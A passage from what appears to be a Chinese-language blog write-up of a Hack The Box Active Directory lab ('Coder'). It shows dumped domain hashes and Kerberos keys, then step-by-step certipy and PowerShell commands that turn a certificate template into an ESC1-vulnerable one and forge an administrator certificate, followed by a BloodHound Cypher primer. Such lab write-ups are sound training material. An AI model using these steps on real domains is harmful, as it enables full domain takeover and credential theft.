class="line">coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::</span><br><span class="line">coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::</span><br><span class="line">coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::</span><br><span class="line">coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::</span><br><span class="line">coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::</span><br><span class="line">coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:86a6a038ff6058c56a74e2e35008f6b037b8e7bca8c75cc5ee4495f77d0be71e</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:6d63b0853502cbbc8c8e40ad8fe88fa3</span><br><span class="line">Administrator:des-cbc-md5:37feabd9d9575785</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:aeb517a1efec8b79479cb1432e734555bc1039bcbd77bcdc39234b37199a70d3</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:2bab4af978e4cee0b58fa1d377d35981</span><br><span class="line">krbtgt:des-cbc-md5:100489b5839798cb</span><br><span class="line">coder.htb\e.black:aes256-cts-hmac-sha1-96:ccb6c47af9a05d91e7610fe396cd8ffcc0e51279a2eee253fab1fb40536a5a85</span><br><span class="line">coder.htb\e.black:aes128-cts-hmac-sha1-96:650ad0d49ab4bcff325a7f2a846d433f</span><br><span class="line">coder.htb\e.black:des-cbc-md5:89290da2c2cd16ec</span><br><span class="line">coder.htb\c.cage:aes256-cts-hmac-sha1-96:ea9cc2144c3106e9325b1ddda16c27c644d9f9b7e95098581ceba19c75d9b296</span><br><span class="line">coder.htb\c.cage:aes128-cts-hmac-sha1-96:2cff13848c9e8d07339a6ab41bf72088</span><br><span class="line">coder.htb\c.cage:des-cbc-md5:fd6d578510df1af1</span><br><span class="line">coder.htb\j.briggs:aes256-cts-hmac-sha1-96:ec3ac8b99094903a3ca006a725dc0867666347efb4baf04d8b2f8b0305ab65ee</span><br><span class="line">coder.htb\j.briggs:aes128-cts-hmac-sha1-96:39050d78545c40645fa889c13200f8f7</span><br><span class="line">coder.htb\j.briggs:des-cbc-md5:7f5286d35def8f15</span><br><span class="line">coder.htb\l.kang:aes256-cts-hmac-sha1-96:d7eb03d2695638c4ba423cd88e22dcdd7c0f6da996e5d6ed3af6c6d7e6c56661</span><br><span class="line">coder.htb\l.kang:aes128-cts-hmac-sha1-96:25ad8331aa0fa2b26e220040b9e55937</span><br><span class="line">coder.htb\l.kang:des-cbc-md5:571a573e61ced640</span><br><span class="line">coder.htb\s.blade:aes256-cts-hmac-sha1-96:ceeab374597121113f3bdee3aab1fed0522506909b2f1ec24dfe36045eb3c252</span><br><span class="line">coder.htb\s.blade:aes128-cts-hmac-sha1-96:69f4cada02748fba948e4c15460add9e</span><br><span class="line">coder.htb\s.blade:des-cbc-md5:26eca8ad9deaada2</span><br><span class="line">coder.htb\svc_teamcity:aes256-cts-hmac-sha1-96:b6c7ed72b4434a89c56295df6b42ca68937702dda15f90f23423e8712abce030</span><br><span class="line">coder.htb\svc_teamcity:aes128-cts-hmac-sha1-96:d6604e2fadb40bbf71708e7b9c9734a7</span><br><span class="line">coder.htb\svc_teamcity:des-cbc-md5:264ab5645ed91c86</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:a43b686fdd5f2e576ad834c5b1d4327dd5bdbd3ec579677343a2c6c43c8f1740</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:22192237a3cb399c19a6b469dcd1cba8</span><br><span class="line">DC01$:des-cbc-md5:cb9758c162ba4943</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
<p>最后利用管理员哈希获取root flag</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427155644.png" alt="微信截图_20250427155644"></p>
<h2 id="靶机拓展"><a class="markdownIt-Anchor" href="#靶机拓展"></a> 靶机拓展</h2>
<p>虽然靶机到这里flag已经拿完了，但是这个靶机还有很多值得我们去发掘的地方，难道真的只能使用CVE-2022–26923吗？</p>
<p>上面我们知道我么具有<code>e.black</code>属于<code>PKI Admins</code>，我们有权导入任何易受攻击的模板，我们先枚举一下当前域中的所有证书模板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427164557.png" alt="微信截图_20250427164557"></p>
<p>第20个模板是我们刚才利用的Computer模板</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">20</span><br><span class="line">  Template Name                       : Machine</span><br><span class="line">  Display Name                        : Computer</span><br><span class="line">  Certificate Authorities             : coder-DC01-CA</span><br><span class="line">  Enabled                             : True</span><br><span class="line">  Client Authentication               : True</span><br><span class="line">  Enrollment Agent                    : False</span><br><span class="line">  Any Purpose                         : False</span><br><span class="line">  Enrollee Supplies Subject           : False</span><br><span class="line">  Certificate Name Flag               : SubjectRequireDnsAsCn</span><br><span class="line"><span class="code">                                        SubjectAltRequireDns</span></span><br><span class="line"><span class="code">  Enrollment Flag                     : AutoEnrollment</span></span><br><span class="line"><span class="code">  Private Key Flag                    : AttestNone</span></span><br><span class="line"><span class="code">  Extended Key Usage                  : Client Authentication</span></span><br><span class="line"><span class="code">                                        Server Authentication</span></span><br><span class="line"><span class="code">  Requires Manager Approval           : False</span></span><br><span class="line"><span class="code">  Requires Key Archival               : False</span></span><br><span class="line"><span class="code">  Authorized Signatures Required      : 0</span></span><br><span class="line"><span class="code">  Validity Period                     : 1 year</span></span><br><span class="line"><span class="code">  Renewal Period                      : 6 weeks</span></span><br><span class="line"><span class="code">  Minimum RSA Key Length              : 2048</span></span><br><span class="line"><span class="code">  Permissions</span></span><br><span class="line"><span class="code">    Enrollment Permissions</span></span><br><span class="line"><span class="code">      Enrollment Rights               : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Domain Computers</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">    Object Control Permissions</span></span><br><span class="line"><span class="code">      Owner                           : CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">      Write Owner Principals          : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">      Write Dacl Principals           : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">      Write Property Principals       : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                        CODER.HTB\Enterprise Admins</span></span><br></pre></td></tr></table></figure>
<p>假如说我们需要利用的恶意模板是ESC1，那么我们要做的就是将当前的Computer模板修改为满足ESC1特征的模板即可</p>
<blockquote>
<p>存在 ESC1 漏洞的证书模板允许低权限用户代表任意由用户指定的域对象进行注册并请求证书。这意味着，任何拥有注册权限的用户都可以为具有高权限的账户（如域管理员账户）请求证书。</p>
</blockquote>
<p>ESC1特征为：</p>
<ul>
<li>Client Authentication: True</li>
<li>Enabled: True</li>
<li>Enrollee Supplies Subject: True    申请证书的人（Enrollee）可以自己填写证书的Subject字段的内容</li>
<li>Requires Management Approval: False</li>
<li>Authorized Signatures Required: 0</li>
</ul>
<p>上面的Computer模板我们需要修改<code>Enrollee Supplies Subject</code>和<code>Certificate Name Flag</code>  两个字段，现在我们要了解字段怎么进行修改，直接在<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/blob/2780d5361121dd4ec79da3f64cfb1984c4f779c6/certipy/lib/constants.py#L73">Certipy的存储库</a>中找到了<code>MS_PKI_CERTIFICATE_NAME_FLAG</code>类，类下每个标志均有对应的数字，<code>ENROLLEE_SUPPLIES_SUBJECT</code>标志对应数字 0x00000001</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427172423.png" alt="微信截图_20250427172423"></p>
<p>接下来着手进行修改，首先我们先获取一个对象</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Export-ADCSTemplate</span> <span class="literal">-displayname</span> Computer &gt; computer.json</span><br><span class="line"><span class="variable">$computer</span> = <span class="built_in">gc</span> computer.json <span class="literal">-raw</span> | <span class="built_in">ConvertFrom-Json</span></span><br></pre></td></tr></table></figure>
<p>我们看一下具体需要修改什么值</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span> | <span class="built_in">get-member</span> | findstr Name<span class="literal">-Flag</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427174319.png" alt="微信截图_20250427174319"></p>
<p>需要修改<code>msPKI-Certificate-Name-Flag</code>，我们将其修改为 0x1</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span>.<span class="string">&#x27;msPKI-Certificate-Name-Flag&#x27;</span> = <span class="number">0</span>x1</span><br></pre></td></tr></table></figure>
<p>接下来的步骤就和上面基本上一致了，转回 json格式，创建模板，并为 e.black 注册证书</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$computer</span> | <span class="built_in">ConvertTo-Json</span> | <span class="built_in">Set-Content</span> my<span class="literal">-esc1</span>.json           </span><br><span class="line"><span class="built_in">New-ADCSTemplate</span> <span class="literal">-DisplayName</span> <span class="string">&quot;My-ESC1&quot;</span> <span class="literal">-Publish</span> <span class="literal">-JSON</span> (<span class="built_in">gc</span> my<span class="literal">-esc1</span>.json <span class="literal">-raw</span>)</span><br><span class="line"><span class="built_in">Set-ADCSTemplateACL</span> <span class="literal">-DisplayName</span> <span class="string">&quot;My-ESC1&quot;</span> <span class="literal">-type</span> allow <span class="literal">-identity</span> <span class="string">&#x27;coder\e.black&#x27;</span> <span class="literal">-enroll</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427175559.png" alt="微信截图_20250427175559"></p>
<p>现在我们利用Certipy-ad扫描一下易受攻击的证书模板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -text -stdout -vulnerable  </span><br></pre></td></tr></table></figure>
<p>输出的结果如下所示</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line"><span class="code">    CA Name                             : coder-DC01-CA</span></span><br><span class="line"><span class="code">    DNS Name                            : dc01.coder.htb</span></span><br><span class="line"><span class="code">    Certificate Subject                 : CN=coder-DC01-CA, DC=coder, DC=htb</span></span><br><span class="line"><span class="code">    Certificate Serial Number           : 2180F0D10CFECB9840260D0730724BDF</span></span><br><span class="line"><span class="code">    Certificate Validity Start          : 2022-06-29 03:51:44+00:00</span></span><br><span class="line"><span class="code">    Certificate Validity End            : 2052-06-29 04:01:44+00:00</span></span><br><span class="line"><span class="code">    Web Enrollment                      : Disabled</span></span><br><span class="line"><span class="code">    User Specified SAN                  : Disabled</span></span><br><span class="line"><span class="code">    Request Disposition                 : Issue</span></span><br><span class="line"><span class="code">    Enforce Encryption for Requests     : Enabled</span></span><br><span class="line"><span class="code">    Permissions</span></span><br><span class="line"><span class="code">      Owner                             : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">      Access Rights</span></span><br><span class="line"><span class="code">        ManageCertificates              : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        ManageCa                        : CODER.HTB\Administrators</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Enroll                          : CODER.HTB\Authenticated Users</span></span><br><span class="line"><span class="code">Certificate Templates</span></span><br><span class="line"><span class="code">  0</span></span><br><span class="line"><span class="code">    Template Name                       : My-ESC1</span></span><br><span class="line"><span class="code">    Display Name                        : My-ESC1</span></span><br><span class="line"><span class="code">    Certificate Authorities             : coder-DC01-CA</span></span><br><span class="line"><span class="code">    Enabled                             : True</span></span><br><span class="line"><span class="code">    Client Authentication               : True</span></span><br><span class="line"><span class="code">    Enrollment Agent                    : False</span></span><br><span class="line"><span class="code">    Any Purpose                         : False</span></span><br><span class="line"><span class="code">    Enrollee Supplies Subject           : True</span></span><br><span class="line"><span class="code">    Certificate Name Flag               : EnrolleeSuppliesSubject</span></span><br><span class="line"><span class="code">    Enrollment Flag                     : AutoEnrollment</span></span><br><span class="line"><span class="code">    Private Key Flag                    : AttestNone</span></span><br><span class="line"><span class="code">    Extended Key Usage                  : Server Authentication</span></span><br><span class="line"><span class="code">                                          Client Authentication</span></span><br><span class="line"><span class="code">    Requires Manager Approval           : False</span></span><br><span class="line"><span class="code">    Requires Key Archival               : False</span></span><br><span class="line"><span class="code">    Authorized Signatures Required      : 0</span></span><br><span class="line"><span class="code">    Validity Period                     : 1 year</span></span><br><span class="line"><span class="code">    Renewal Period                      : 6 weeks</span></span><br><span class="line"><span class="code">    Minimum RSA Key Length              : 2048</span></span><br><span class="line"><span class="code">    Permissions</span></span><br><span class="line"><span class="code">      Enrollment Permissions</span></span><br><span class="line"><span class="code">        Enrollment Rights               : CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code">      Object Control Permissions</span></span><br><span class="line"><span class="code">        Owner                           : CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code">        Full Control Principals         : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Owner Principals          : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Dacl Principals           : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">        Write Property Principals       : CODER.HTB\Domain Admins</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Local System</span></span><br><span class="line"><span class="code">                                          CODER.HTB\Enterprise Admins</span></span><br><span class="line"><span class="code">    [!] Vulnerabilities</span></span><br><span class="line"><span class="code">      ESC1                              : &#x27;CODER.HTB\\Erron Black&#x27; can enroll, enrollee supplies subject and template allows client authentication</span></span><br><span class="line"><span class="code">      ESC4                              : Template is owned by CODER.HTB\Erron Black</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
<p>扫描完发现存在两个ESC漏洞，这个ESC4不是我们创建的，似乎是原本就存在</p>
<h3 id="esc1利用"><a class="markdownIt-Anchor" href="#esc1利用"></a> ESC1利用</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -target coder.htb -ca CODER-DC01-CA -template My-ESC1 -upn administrator@coder.htb</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427183931.png" alt="微信截图_20250427183931"></p>
<p>可能会出现下面的错误</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427184005.png" alt="微信截图_20250427184005"></p>
<p>原因是证书不存在了，我们只需要重新发布证书即可</p>
<p>出现下面的错误只需要再重新申请一次证书即可，仅仅是一个超时罢了</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427184109.png" alt="微信截图_20250427184109"></p>
<p>接下来使用pfx文件进行管理员认证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator.pfx </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427184918.png" alt="微信截图_20250427184918"></p>
<p>仍然成功获取哈希</p>
<h3 id="bloodhound自定义查询"><a class="markdownIt-Anchor" href="#bloodhound自定义查询"></a> Bloodhound自定义查询</h3>
<p>在HTB的官方wp中看到了利用cypher进行域内关系的枚举，简单的学一下cypher并尝试进行一下简单枚举</p>
<h4 id="基础语法"><a class="markdownIt-Anchor" href="#基础语法"></a> 基础语法</h4>
<table>
<thead>
<tr>
<th>元素</th>
<th>写法</th>
<th>例子</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>节点（点）</td>
<td><code>(变量:标签)</code></td>
<td><code>(u:User)</code></td>
<td>一个 User</td>
</tr>
<tr>
<td>关系（边）</td>
<td><code>-[变量:关系名]-&gt;</code></td>
<td><code>-[m:MemberOf]-&gt;</code></td>
<td>成员关系</td>
</tr>
<tr>
<td>查询</td>
<td><code>MATCH</code></td>
<td><code>MATCH (u:User)</code></td>
<td>找所有用户</td>
</tr>
<tr>
<td>返回结果</td>
<td><code>RETURN</code></td>
<td><code>RETURN u.name</code></td>
<td>返回用户名</td>
</tr>
<tr>
<td>条件筛选</td>
<td><code>WHERE</code></td>
<td><code>WHERE u.enabled = true</code></td>
<td>只要启用的账户</td>
</tr>
<tr>
<td></td>
<td><code>ORDER BY</code></td>
<td></td>
<td>排序</td>
</tr>
<tr>
<td></td>
<td><code>shortestPath</code></td>
<td></td>
<td>找最短路径</td>
</tr>
<tr>
<td></td>
<td><code>LIMIT</code></td>
<td></td>
<td>限制返回数量</td>
</tr>
</tbody>
</table>
<h4 id="关系方向"><a class="markdownIt-Anchor" href="#关系方向"></a> 关系方向</h4>
<p><code>()-[:MemberOf]-&gt;()</code>：<strong>A属于B</strong></p>
<p><code>()&lt;-[ :HasSession ]-( )</code>：<strong>B有A的会话</strong></p>
<p>枚举BuildAgent Mgmt组的关联关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(o:OU)-[r:Contains*0..]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>*0..</code>：星号+范围，表示可以沿着0条、1条、2条、任意多条 <code>Contains</code> 边行走</p>
<p><code>(n)</code>：走到的目标节点，叫做 <code>n</code></p>
</blockquote>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427212922.png" alt="微信截图_20250427212922"></p>
<p>有助于我们充分了解OU的组成为<code>OU=BUILDAGENTS,OU=DEVELOPMENT,DC=CODER,DC=HTB  </code></p>
<p>接下来全面了解节点的层级结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (o1)-[r1:Contains]-&gt;(o2:OU) WITH o1 MATCH p=(d)-[r2:Contains*0..]-&gt;(o1)-</span><br><span class="line">[r3:Contains]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure>
<p>从域或者更上层的OU，一路Contains找到o1，再看o1下面直接Contains了什么东西</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427214256.png" alt="微信截图_20250427214256"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Chromos2me, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CVE-2022–26923/" class="tag">#CVE-2022–26923</a><a href="/tags/ESC/" class="tag">#ESC</a><a href="/tags/CI-CD/" class="tag">#CI/CD</a><a href="/tags/2FA/" class="tag">#2FA</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        <a class="next"></a>
        
        <a href="/2025/04/23/HTB-CrownJewel-2/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">HTB-CrownJewel-2</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/Chromos2me" class="item">GitHub</a>
                
                <a href="3079749425@qq.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Chromos2me<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>

</body>
</html>